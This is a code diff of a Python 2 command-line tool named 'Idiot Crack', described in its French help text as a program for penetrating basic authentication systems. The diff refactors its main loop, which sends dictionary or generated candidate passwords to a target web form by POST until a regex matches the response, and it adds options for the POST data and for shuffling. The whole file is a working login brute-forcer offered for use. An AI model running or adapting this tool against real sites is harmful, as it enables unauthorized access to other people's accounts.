@@ -65,12 +65,16 @@ str(i) for i in xrange(10)] + [chr(65 + i) for i in xrange(26)] + \
     def shuffle(self):
         shuffle(self._dico) if self._dico is not None else shuffle(self._symbol)
 
-    def _rundico(self):
+    def _run(self):
         send_data = Sendform(self._target)
-    
+
+        if self._dico is None:
+             b = Bruteforce(self._symbol, self._extremum) 
+        
+        total_combination = len(self._dico) if self._dico is not None else b.numberofpossibilities()
+        total_combination_fixed = total_combination
+            
         if self._verbose:
-            total_combination = len(self._dico)        
-            total_combination_fixed = total_combination
             speed = 0
 
             idc_verbose = IdiotCrackVerbose("Idiot Crack", "version 1.0 alpha", "Programme de penetration de systemes d'authentification basiques")        
@@ -79,60 +83,27 @@ str(i) for i in xrange(10)] + [chr(65 + i) for i in xrange(26)] + \
         
         start_test_list = time()
 
-        for word in self._dico:
+        tmp = b.go_next() if self._dico is None else self._dico[0]
+        while total_combination > 0:
+            total_combination -= 1
             if self._verbose: 
-                total_combination -= 1
                 if (time() - start_test_list) > 5.0:
                     speed = int((total_combination_fixed - total_combination) / (time() - start_test_list))
                 idc_verbose.displayonerun(total_combination, total_combination_fixed, speed)
 
-            send_data.send_data(self._post_data + word, True)
-
-
-            if re.search(self._stop_when, send_data.get_response()):
-                if self._verbose:
-                    idc_verbose.close()
-                print("Success with " + word)
-                break
-
-    
-
-    def run(self):
-        if self._dico is not None:
-            self._rundico()
-            sys.exit()
-        # Initialisation des instances
-        b = Bruteforce(self._symbol, self._extremum)
-        send_data = Sendform(self._target)
-        
-        if self._verbose:
-            total_combination = b.numberofpossibilities()       
-            total_combination_fixed = total_combination
-            speed = 0
-
-            idc_verbose = IdiotCrackVerbose("Idiot Crack", "version 1.0 alpha", "Programme de penetration de systemes d'authentification basiques")        
-            idc_verbose.displayresume(total_combination)
-            idc_verbose.initrun()
-        
-        start_bruteforce = time()
-        tmp = b.go_next()
-        while tmp != None:
-            # print tmp
-            if self._verbose: 
-                total_combination -= 1
-                if (time() - start_bruteforce) > 5.0:
-                    speed = int((total_combination_fixed - total_combination) / (time() - start_bruteforce))
-                idc_verbose.displayonerun(total_combination, total_combination_fixed, speed)
-
             send_data.send_data(self._post_data + tmp, True)
 
-
             if re.search(self._stop_when, send_data.get_response()):
                 if self._verbose:
                     idc_verbose.close()
-                print("Success with " + tmp)  
-                break
-            tmp = b.go_next()
+                return tmp  
+            
+            tmp = b.go_next() if self._dico is None else self._dico[total_combination_fixed - total_combination]
+        
+        return None
+
+    def run(self):
+        return self._run() 
 
 def help():
     """
@@ -153,8 +124,8 @@ def help():
 alpha-numériques.Pour spécifier votre propre liste de symboles, vous \
 pouvez l'indiquer par cette commande."
 
-    print "-d\tVous pouvez indiquer une liste de mots à tester\
-directement sans passer par la génération de mots par liste de\
+    print "-d\tVous pouvez indiquer une liste de mots à tester \
+directement sans passer par la génération de mots par liste de \
 symboles."
 
     print "-e\tPar défaut, le programme teste toutes les possiblités \
@@ -165,11 +136,16 @@ il suffit d'écire 'min,max' en argument, avec min et max deux entiers."
 s'effectue par une condition regex qui est testé sur la page de \
 l'application web reçue après l'envoi d'une requête."
     
-    print "-g\t Génère une liste de possibilités alpha-numériques\
+    print "-g\tGénère une liste de possibilités alpha-numériques \
 d'une taille comprise entre 1 et 8 inclue."
+    print "--data\tSpécifie une liste de données à envoyer par la \
+methode POST sous format 'token1=data1&token2='. Le dernier token \
+dans l'exemple est celui dont la valeur sera généré par le programme."
+    print "--rand\tMélange la liste de symboles ou le dictionnaire \
+utilisé pour le bruteforce."
 def main():
     """ Script """
-    list_argv = dict(getopt.getopt(sys.argv[1:], "hgvt:d:s:e:r:", ["data=", "random"])[0])
+    list_argv = dict(getopt.getopt(sys.argv[1:], "hgvt:d:s:e:r:", ["data=", "rand"])[0])
     
     # Demande de la liste des commandes
     if '-h' in list_argv or list_argv == {}:
@@ -216,10 +192,17 @@ def main():
     if "--data" in list_argv:
         idc.setpostdata(list_argv["--data"])
 
-    if "--random" in list_argv:
+    if "--rand" in list_argv:
         idc.shuffle()
 
-    idc.run()
+
+    ## Execution du programme ##
+    word_found = idc._run()
+    
+    if word_found is None:
+        print "Aucun resultat trouve dans la liste des mots testes"
+    else:
+        print "Mot trouve:" + word_found
 
 if __name__ == "__main__":
     main()
